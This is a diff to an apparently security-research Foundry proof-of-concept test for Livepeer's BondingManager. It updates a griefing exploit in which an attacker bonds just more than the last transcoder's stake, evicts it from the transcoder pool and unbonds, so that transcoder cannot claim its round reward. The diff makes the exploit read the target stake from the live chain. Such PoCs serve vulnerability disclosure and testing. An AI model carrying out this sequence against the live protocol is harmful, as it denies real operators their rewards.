@@ -70,6 +70,8 @@ interface IBondingManager {
     function getTranscoder(address _transcoder) external view returns (TranscoderData memory);
 
     function getDelegator(address _delegator) external view returns (DelegatorData memory);
+
+    function transcoderTotalStake(address _transcoder) external view returns (uint256);
 }
 
 interface IRoundsManager {
@@ -86,6 +88,7 @@ contract BondingManagerGriefLastTranscoderRewardPoc is GovernorBaseTest {
     address public immutable minter;
     IBondingManager public immutable bondingManager;
     IRoundsManager public immutable roundsManager;
+    uint256 public lastTranscoderTotalStake;
 
     constructor() {
         lpt = LivepeerToken(getContract("LivepeerToken"));
@@ -97,8 +100,10 @@ contract BondingManagerGriefLastTranscoderRewardPoc is GovernorBaseTest {
     uint256 roundLength;
 
     function setUp() public {
-        vm.rollFork(290482185);
+        vm.rollFork(430253488); // Feb 9, 2026 https://arbiscan.io/block/430253488
         roundLength = roundsManager.roundLength();
+        address lastTranscoder = _getLastTranscoder();
+        lastTranscoderTotalStake = bondingManager.transcoderTotalStake(lastTranscoder);
     }
 
     function _skipToNextRound() internal {
@@ -135,11 +140,11 @@ contract BondingManagerGriefLastTranscoderRewardPoc is GovernorBaseTest {
         address attacker = newAddr();
         address lastTranscoder = _getLastTranscoder();
 
-        // Attacker needs 450 + 2 lpt to execute the attack
+        // Attacker needs lastTranscoderTotalStake + 2 lpt to execute the attack
         vm.prank(minter);
-        lpt.mint(attacker, 450 * 1e18 + 2);
+        lpt.mint(attacker, lastTranscoderTotalStake + 2);
 
-        // ---------------------- ROUND = 45816 ----------------------
+        // ---------------------- ROUND ONE ----------------------
         _skipToNextRound();
 
         // Attacker bonds for themself to make their status in the next round become "Bonded"
@@ -148,12 +153,12 @@ contract BondingManagerGriefLastTranscoderRewardPoc is GovernorBaseTest {
         bondingManager.bond(1, attacker);
         vm.stopPrank();
 
-        // ---------------------- ROUND = 45817 ----------------------
+        // ---------------------- ROUND TWO ----------------------
         _skipToNextRound();
 
         // Attacker bonds more than the last transcoder and kicks them out of the `transcoderPool`
         vm.startPrank(attacker);
-        bondingManager.bond(450 * 1e18, attacker);
+        bondingManager.bond(lastTranscoderTotalStake, attacker);
         assertEq(attacker, _getLastTranscoder());
 
         // Attacker unbonds all to make the `transcoderPool` not full
@@ -165,7 +170,7 @@ contract BondingManagerGriefLastTranscoderRewardPoc is GovernorBaseTest {
 
         assertEq(_getTranscoderData(lastTranscoder).activationRound, roundsManager.currentRound() + 1);
 
-        // The `lastTranscoder` is unable to claim the reward for ROUND = 3640 because it is considered as inactive
+        // The `lastTranscoder` is unable to claim the reward for ROUND TWO because it is considered as inactive
         vm.expectRevert(bytes("caller must be an active transcoder"));
         vm.prank(lastTranscoder);
         bondingManager.reward();
@@ -178,13 +183,13 @@ contract BondingManagerGriefLastTranscoderRewardPoc is GovernorBaseTest {
         address attackerForRebond = newAddr();
         address lastTranscoder = _getLastTranscoder();
 
-        // Attacker needs 450 + 3 lpt to execute the attack
+        // Attacker needs lastTranscoderTotalStake + 5 lpt to execute the attack
         vm.startPrank(minter);
-        lpt.mint(attacker, 450 * 1e18 + 1);
+        lpt.mint(attacker, lastTranscoderTotalStake + 3);
         lpt.mint(attackerForRebond, 2);
         vm.stopPrank();
 
-        // ---------------------- ROUND = 45816 ----------------------
+        // ---------------------- ROUND ONE ----------------------
         _skipToNextRound();
 
         // Attacker bonds to the last transcoder and immediately unbonds
@@ -199,12 +204,12 @@ contract BondingManagerGriefLastTranscoderRewardPoc is GovernorBaseTest {
         bondingManager.bond(1, attacker);
         vm.stopPrank();
 
-        // ---------------------- ROUND = 45817 ----------------------
+        // ---------------------- ROUND TWO ----------------------
         _skipToNextRound();
 
         // Attacker bonds more than the last transcoder and kicks them out of the `transcoderPool`
         vm.startPrank(attacker);
-        bondingManager.bond(450 * 1e18, attacker);
+        bondingManager.bond(lastTranscoderTotalStake + 2, attacker);
         assertEq(attacker, _getLastTranscoder());
 
         // Attacker unbonds all to make the `transcoderPool` not full
@@ -221,7 +226,7 @@ contract BondingManagerGriefLastTranscoderRewardPoc is GovernorBaseTest {
 
         assertEq(_getTranscoderData(lastTranscoder).activationRound, roundsManager.currentRound() + 1);
 
-        // The `lastTranscoder` is unable to claim the reward for ROUND = 3640 because it is considered as inactive
+        // The `lastTranscoder` is unable to claim the reward for ROUND TWO because it is considered as inactive
         vm.expectRevert(bytes("caller must be an active transcoder"));
         vm.prank(lastTranscoder);
         bondingManager.reward();
